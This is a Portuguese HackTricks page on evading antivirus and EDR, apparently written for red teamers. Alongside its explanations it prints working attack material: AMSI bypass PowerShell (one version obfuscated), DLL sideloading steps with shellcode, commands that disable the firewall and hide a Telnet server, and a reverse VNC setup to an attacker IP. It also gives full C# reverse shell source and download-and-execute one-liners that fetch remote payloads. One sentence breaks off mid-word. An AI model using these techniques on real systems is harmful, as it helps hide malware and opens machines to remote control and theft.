# **Bypass de Antivírus (AV)**

<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para** os repositórios [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Esta página foi escrita por** [**@m2rc\_p**](https://twitter.com/m2rc\_p)**!**

## **Metodologia de Evasão de AV**

Atualmente, os AVs utilizam diferentes métodos para verificar se um arquivo é malicioso ou não, detecção estática, análise dinâmica e, para os EDRs mais avançados, análise comportamental.

### **Detecção estática**

A detecção estática é alcançada marcando strings maliciosas conhecidas ou arrays de bytes em um binário ou script, e também extraindo informações do próprio arquivo (por exemplo, descrição do arquivo, nome da empresa, assinaturas digitais, ícone, checksum, etc.). Isso significa que usar ferramentas públicas conhecidas pode fazer com que você seja detectado mais facilmente, pois provavelmente foram analisadas e marcadas como maliciosas. Existem algumas maneiras de contornar esse tipo de detecção:

* **Criptografia**

Se você criptografar o binário, não haverá maneira do AV detectar seu programa, mas você precisará de algum tipo de carregador para descriptografar e executar o programa na memória.

* **Ofuscação**

Às vezes, tudo que você precisa fazer é alterar algumas strings em seu binário ou script para passar pelo AV, mas isso pode ser uma tarefa demorada, dependendo do que você está tentando ofuscar.

* **Ferramentas personalizadas**

Se você desenvolver suas próprias ferramentas, não haverá assinaturas ruins conhecidas, mas isso leva muito tempo e esforço.

{% hint style="info" %}
Uma boa maneira de verificar contra a detecção estática do Windows Defender é [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Basicamente, ele divide o arquivo em vários segmentos e depois solicita ao Defender que escaneie cada um individualmente, dessa forma, ele pode dizer exatamente quais são as strings ou bytes marcados em seu binário.
{% endhint %}

Recomendo muito que você confira esta [playlist do YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf) sobre Evasão de AV na prática.

### **Análise dinâmica**

A análise dinâmica ocorre quando o AV executa seu binário em uma sandbox e observa atividades maliciosas (por exemplo, tentando descriptografar e ler as senhas do seu navegador, realizando um minidespejo no LSASS, etc.). Esta parte pode ser um pouco mais complicada de lidar, mas aqui estão algumas coisas que você pode fazer para evadir as sandboxes.

* **Atraso antes da execução** Dependendo de como é implementado, pode ser uma ótima maneira de contornar a análise dinâmica do AV. Os AVs têm um tempo muito curto para escanear arquivos para não interromper o fluxo de trabalho do usuário, então usar atrasos longos pode perturbar a análise de binários. O problema é que muitas sandboxes de AV podem simplesmente ignorar o atraso, dependendo de como é implementado.
* **Verificação dos recursos da máquina** Geralmente, as sandboxes têm recursos muito limitados para trabalhar (por exemplo, < 2GB de RAM), caso contrário, poderiam retardar a máquina do usuário. Você também pode ser muito criativo aqui, por exemplo, verificando a temperatura da CPU ou até mesmo as velocidades do ventilador, nem tudo será implementado na sandbox.
* **Verificações específicas da máquina** Se você deseja segmentar um usuário cuja estação de trabalho está associada ao domínio "contoso.local", você pode verificar o domínio do computador para ver se corresponde ao que você especificou, se não corresponder, você pode fazer seu programa sair.

Acontece que o nome do computador da Sandbox do Microsoft Defender é HAL9TH, então, você pode verificar o nome do computador em seu malware antes da detonação, se o nome corresponder a HAL9TH, significa que você está dentro da sandbox do defender, então você pode fazer seu programa sair.

<figure><img src="../.gitbook/assets/image (3) (6).png" alt=""><figcaption><p>fonte: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Algumas outras dicas realmente boas de [@mgeeky](https://twitter.com/mariuszbit) para combater as Sandboxes

<figure><img src="../.gitbook/assets/image (2) (1) (1) (2) (1).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Como mencionamos anteriormente neste post, **ferramentas públicas** eventualmente **serão detectadas**, então, você deve se perguntar algo:

Por exemplo, se você deseja despejar o LSASS, **você realmente precisa usar o mimikatz**? Ou poderia usar um projeto diferente que seja menos conhecido e também despeje o LSASS.

A resposta correta provavelmente é a última opção. Tomando o mimikatz como exemplo, ele é provavelmente um dos, se não o mais marcado malware pelos AVs e EDRs, enquanto o projeto em si é super legal, também é um pesadelo trabalhar com ele para contornar os AVs, então procure alternativas para o que você está tentando alcançar.

{% hint style="info" %}
Ao modificar seus payloads para evasão, certifique-se de **desativar o envio automático de amostras** no defender, e por favor, seriamente, **NÃO FAÇA UPLOAD NO VIRUSTOTAL** se seu objetivo é alcançar evasão a longo prazo. Se você deseja verificar se seu payload é detectado por um AV específico, instale-o em uma VM, tente desativar o envio automático de amostras, e teste lá até ficar satisfeito com o resultado.
{% endhint %}

## EXEs vs DLLs

Sempre que possível, **priorize o uso de DLLs para evasão**, em minha experiência, os arquivos DLL são geralmente **muito menos detectados** e analisados, então é um truque muito simples de usar para evitar detecção em alguns casos (se seu payload tiver alguma maneira de ser executado como uma DLL, é claro).

Como podemos ver nesta imagem, um Payload DLL do Havoc tem uma taxa de detecção de 4/26 no antiscan.me, enquanto o payload EXE tem uma taxa de detecção de 7/26.

<figure><img src="../.gitbook/assets/image (6) (3) (1).png" alt=""><figcaption><p>comparação antiscan.me de um payload EXE normal do Havoc vs um DLL normal do Havoc</p></figcaption></figure>

Agora mostraremos alguns truques que você pode usar com arquivos DLL para ser muito mais furtivo.
## Carregamento Lateral de DLL e Proxying

**O Carregamento Lateral de DLL** aproveita a ordem de busca de DLL usada pelo carregador posicionando tanto a aplicação vítima quanto a carga maliciosa lado a lado.

Você pode verificar programas suscetíveis ao Carregamento Lateral de DLL usando [Siofra](https://github.com/Cybereason/siofra) e o seguinte script powershell:

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
{% endcode %}

Este comando irá exibir a lista de programas suscetíveis a DLL hijacking dentro de "C:\Program Files\\" e os arquivos DLL que eles tentam carregar.

Eu recomendo fortemente que você **explore os programas suscetíveis a DLL Hijack/Sideload por conta própria**, essa técnica é bastante furtiva se feita corretamente, mas se você usar programas de DLL Sideload publicamente conhecidos, pode ser facilmente descoberto.

Apenas colocar uma DLL maliciosa com o nome que um programa espera carregar não carregará sua carga útil, pois o programa espera algumas funções específicas dentro dessa DLL, para corrigir esse problema, vamos usar outra técnica chamada **DLL Proxying/Forwarding**.

**DLL Proxying** encaminha as chamadas que um programa faz do DLL proxy (e malicioso) para o DLL original, preservando assim a funcionalidade do programa e sendo capaz de lidar com a execução de sua carga útil.

Eu estarei usando o projeto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Estes são os passos que segui:

{% code overflow="wrap" %}
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
{% endcode %}

O último comando nos dará 2 arquivos: um modelo de código-fonte DLL e a DLL original renomeada.

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

Estes são os resultados:

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Tanto nosso shellcode (codificado com [SGN](https://github.com/EgeBalci/sgn)) quanto a DLL proxy têm uma taxa de detecção de 0/26 no [antiscan.me](https://antiscan.me)! Eu chamaria isso de um sucesso.

<figure><img src="../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Eu **recomendo fortemente** que você assista ao [VOD do twitch de S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) sobre DLL Sideloading e também [o vídeo de ippsec](https://www.youtube.com/watch?v=3eROsG\_WNpE) para aprender mais sobre o que discutimos de forma mais aprofundada.
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze é um kit de ferramentas de payload para contornar EDRs usando processos suspensos, chamadas de sistema diretas e métodos de execução alternativos`

Você pode usar o Freeze para carregar e executar seu shellcode de maneira furtiva.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
A evasão é apenas um jogo de gato e rato, o que funciona hoje pode ser detectado amanhã, então nunca confie em apenas uma ferramenta, se possível, tente encadear várias técnicas de evasão.
{% endhint %}

## AMSI (Interface de Verificação Anti-Malware)

AMSI foi criado para prevenir "[malware sem arquivo](https://en.wikipedia.org/wiki/Fileless\_malware)". Inicialmente, os AVs eram capazes de escanear apenas **arquivos em disco**, então se você conseguisse executar payloads **diretamente na memória**, o AV não poderia fazer nada para impedir, pois não tinha visibilidade suficiente.

O recurso AMSI está integrado nestes componentes do Windows.

- Controle de Conta de Usuário, ou UAC (elevação de instalação de EXE, COM, MSI ou ActiveX)
- PowerShell (scripts, uso interativo e avaliação de código dinâmico)
- Windows Script Host (wscript.exe e cscript.exe)
- JavaScript e VBScript
- Macros do Office VBA

Ele permite que soluções antivírus inspecionem o comportamento de scripts expondo o conteúdo do script de forma não criptografada e não ofuscada.

Executar `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produzirá o seguinte alerta no Windows Defender.

<figure><img src="../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>

Observe como ele antepõe `amsi:` e depois o caminho para o executável a partir do qual o script foi executado, neste caso, powershell.exe

Não deixamos nenhum arquivo no disco, mas ainda fomos pegos na memória por causa do AMSI.

Existem algumas maneiras de contornar o AMSI:

- **Ofuscação**

Como o AMSI funciona principalmente com detecções estáticas, modificar os scripts que você tenta carregar pode ser uma boa maneira de evitar a detecção.

No entanto, o AMSI tem a capacidade de desofuscar scripts mesmo se tiver várias camadas, então a ofuscação pode ser uma má opção dependendo de como é feita. Isso torna não tão direto de evitar. Embora, às vezes, tudo que você precisa fazer é mudar alguns nomes de variáveis e você estará bem, então depende de quanto algo foi sinalizado.

- **Bypass AMSI**

Como o AMSI é implementado carregando uma DLL no processo powershell (também cscript.exe, wscript.exe, etc.), é possível manipulá-lo facilmente mesmo sendo executado como um usuário não privilegiado. Devido a essa falha na implementação do AMSI, pesquisadores encontraram várias maneiras de evitar a verificação do AMSI.

**Forçando um Erro**

Forçar a inicialização do AMSI a falhar (amsiInitFailed) fará com que nenhuma verificação seja iniciada para o processo atual. Originalmente isso foi divulgado por [Matt Graeber](https://twitter.com/mattifestation) e a Microsoft desenvolveu uma assinatura para evitar um uso mais amplo.

{% code overflow="wrap" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

Tudo o que foi necessário foi uma linha de código powershell para tornar o AMSI inutilizável para o processo powershell atual. Esta linha, é claro, foi sinalizada pelo próprio AMSI, então algumas modificações são necessárias para usar essa técnica.

Aqui está um bypass modificado do AMSI que peguei deste [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
**Patching de Memória**

Esta técnica foi inicialmente descoberta por [@RastaMouse](https://twitter.com/\_RastaMouse/) e envolve encontrar o endereço da função "AmsiScanBuffer" em amsi.dll (responsável por escanear a entrada fornecida pelo usuário) e sobrescrevê-la com instruções para retornar o código para E\_INVALIDARG, dessa forma, o resultado da verificação real retornará 0, o que é interpretado como um resultado limpo.

{% hint style="info" %}
Por favor, leia [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) para uma explicação mais detalhada.
{% endhint %}

Existem também muitas outras técnicas usadas para contornar o AMSI com o powershell, confira [**esta página**](basic-powershell-for-pentesters/#amsi-bypass) e [este repositório](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) para aprender mais sobre elas.

Ou este script que, via patch de memória, irá patchear cada novo Powersh

## Ofuscação

Existem várias ferramentas que podem ser usadas para **ofuscar código C# em texto claro**, gerar **modelos de metaprogramação** para compilar binários ou **ofuscar binários compilados** como:

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: Ofuscador C#**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): O objetivo deste projeto é fornecer um fork de código aberto do [LLVM](http://www.llvm.org/) capaz de fornecer maior segurança de software através da [ofuscação de código](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) e proteção contra adulteração.
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstra como usar a linguagem `C++11/14` para gerar, em tempo de compilação, código ofuscado sem usar nenhuma ferramenta externa e sem modificar o compilador.
* [**obfy**](https://github.com/fritzone/obfy): Adicione uma camada de operações ofuscadas geradas pelo framework de metaprogramação de modelos C++ que tornará a vida da pessoa que deseja quebrar a aplicação um pouco mais difícil.
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz é um ofuscador binário x64 capaz de ofuscar vários arquivos pe diferentes, incluindo: .exe, .dll, .sys
* [**metame**](https://github.com/a0rtega/metame): Metame é um mecanismo simples de código metamórfico para executáveis arbitrários.
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator é um framework de ofuscação de código de granularidade fina para idiomas suportados pelo LLVM usando ROP (programação orientada a retorno). ROPfuscator ofusca um programa no nível de código de montagem transformando instruções regulares em cadeias ROP, frustrando nossa concepção natural de fluxo de controle normal.
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt é um Criptografador .NET PE escrito em Nim
* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor é capaz de converter EXE/DLL existentes em shellcode e então carregá-los

## SmartScreen & MoTW

Você pode ter visto esta tela ao baixar alguns executáveis da internet e executá-los.

O Microsoft Defender SmartScreen é um mecanismo de segurança destinado a proteger o usuário final contra a execução de aplicativos potencialmente maliciosos.

<figure><img src="../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

O SmartScreen funciona principalmente com uma abordagem baseada em reputação, o que significa que aplicativos baixados incomumente acionarão o SmartScreen, alertando e impedindo o usuário final de executar o arquivo (embora o arquivo ainda possa ser executado clicando em Mais Informações -> Executar mesmo assim).

**MoTW** (Mark of The Web) é um [NTFS Alternate Data Stream](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\)) com o nome de Zone.Identifier que é criado automaticamente ao baixar arquivos da internet, juntamente com a URL de onde foi baixado.

<figure><img src="../.gitbook/assets/image (13) (3).png" alt=""><figcaption><p>Verificando o ADS Zone.Identifier de um arquivo baixado da internet.</p></figcaption></figure>

{% hint style="info" %}
É importante observar que executáveis assinados com um certificado de assinatura **confiável** **não acionarão o SmartScreen**.
{% endhint %}

Uma maneira muito eficaz de evitar que seus payloads recebam o Mark of The Web é embalá-los dentro de algum tipo de contêiner como um ISO. Isso acontece porque o Mark-of-the-Web (MOTW) **não** pode ser aplicado a volumes **não NTFS**.

<figure><img src="../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) é uma ferramenta que empacota payloads em contêineres de saída para evitar o Mark-of-the-Web.

Exemplo de uso:
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Aqui está uma demonstração de como contornar o SmartScreen empacotando payloads dentro de arquivos ISO usando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## Reflexão de Assembleia C#

Carregar binários C# na memória é conhecido há bastante tempo e ainda é uma ótima maneira de executar suas ferramentas pós-exploração sem ser detectado pelo AV.

Uma vez que o payload será carregado diretamente na memória sem tocar no disco, só precisaremos nos preocupar em corrigir o AMSI para todo o processo.

A maioria dos frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) já fornecem a capacidade de executar assemblies C# diretamente na memória, mas existem diferentes maneiras de fazer isso:

* **Fork\&Run**

Envolve **iniciar um novo processo sacrificial**, injetar seu código malicioso de pós-exploração nesse novo processo, executar seu código malicioso e, quando terminar, encerrar o novo processo. Isso tem seus benefícios e desvantagens. O benefício do método fork and run é que a execução ocorre **fora** do nosso processo de implante Beacon. Isso significa que se algo der errado ou for detectado em nossa ação de pós-exploração, há uma **maior chance** de nosso **implante sobreviver**. A desvantagem é que há uma **maior chance** de ser detectado por **Detecções Comportamentais**.

<figure><img src="../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>

* **Inline**

Trata-se de injetar o código malicioso de pós-exploração **em seu próprio processo**. Dessa forma, você pode evitar ter que criar um novo processo e fazê-lo ser verificado pelo AV, mas a desvantagem é que se algo der errado com a execução do seu payload, há uma **maior chance** de **perder seu beacon** pois ele pode falhar.

<figure><img src="../.gitbook/assets/image (9) (3) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Se deseja ler mais sobre o carregamento de Assembleias C#, confira este artigo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e o BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
{% endhint %}

Você também pode carregar Assembleias C# **do PowerShell**, confira [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e o vídeo do [S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Utilizando Outras Linguagens de Programação

Conforme proposto em [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), é possível executar código malicioso usando outras linguagens, dando à máquina comprometida acesso **ao ambiente do interpretador instalado no compartilhamento SMB controlado pelo Atacante**.

Ao permitir o acesso aos Binários do Interpretador e ao ambiente no compartilhamento SMB, você pode **executar código arbitrário nessas linguagens na memória** da máquina comprometida.

O repositório indica: O Defender ainda escaneia os scripts, mas ao utilizar Go, Java, PHP, etc., temos **mais flexibilidade para contornar assinaturas estáticas**. Testes com scripts de shell reverso não obfuscados nessas linguagens têm sido bem-sucedidos.

## Evasão Avançada

A evasão é um tópico muito complicado, às vezes é necessário levar em consideração muitas fontes diferentes de telemetria em apenas um sistema, então é praticamente impossível permanecer completamente indetectável em ambientes maduros.

Cada ambiente que você enfrentar terá suas próprias forças e fraquezas.

Eu recomendo fortemente que assista a esta palestra de [@ATTL4S](https://twitter.com/DaniLJ94), para obter uma introdução a técnicas de Evasão Avançadas.

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

Esta também é outra ótima palestra de [@mariuszbit](https://twitter.com/mariuszbit) sobre Evasão em Profundidade.

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **Técnicas Antigas**

### **Verifique quais partes o Defender considera como maliciosas**

Você pode usar [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) que irá **remover partes do binário** até descobrir qual parte o Defender está considerando como maliciosa e dividir isso para você.\
Outra ferramenta que faz a **mesma coisa é** [**avred**](https://github.com/dobin/avred) com um serviço web aberto oferecendo o serviço em [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Servidor Telnet**

Até o Windows10, todos os Windows vinham com um **servidor Telnet** que você poderia instalar (como administrador) fazendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Faça com que **inicie** quando o sistema for iniciado e **execute** agora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Alterar a porta do telnet** (stealth) e desativar o firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Baixe em: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (você quer os downloads binários, não a instalação)

**NO HOST**: Execute _**winvnc.exe**_ e configure o servidor:

* Ative a opção _Disable TrayIcon_
* Defina uma senha em _VNC Password_
* Defina uma senha em _View-Only Password_

Em seguida, mova o binário _**winvnc.exe**_ e o arquivo recém-criado _**UltraVNC.ini**_ dentro do **alvo**

#### **Conexão reversa**

O **atacante** deve **executar dentro** de seu **host** o binário `vncviewer.exe -listen 5900` para que esteja **preparado** para capturar uma conexão **VNC reversa**. Em seguida, dentro do **alvo**: Inicie o daemon winvnc `winvnc.exe -run` e execute `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ATENÇÃO:** Para manter o sigilo, você não deve fazer algumas coisas

* Não inicie `winvnc` se já estiver em execução ou você acionará um [popup](https://i.imgur.com/1SROTTl.png). verifique se está em execução com `tasklist | findstr winvnc`
* Não inicie `winvnc` sem o `UltraVNC.ini` no mesmo diretório ou abrirá [a janela de configuração](https://i.imgur.com/rfMQWcf.png)
* Não execute `winvnc -h` para obter ajuda ou você acionará um [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Baixe em: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Dentro do GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Agora **inicie o ouvinte** com `msfconsole -r file.rc` e **execute** o **payload xml** com:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**O defensor atual irá encerrar o processo muito rapidamente.**

### Compilando nosso próprio shell reverso

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primeiro shell reverso em C#

Compile com:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Use com:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando compilador
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download e execução automáticos:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

Lista de ofuscadores C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
* [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
* [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
* [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
* [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
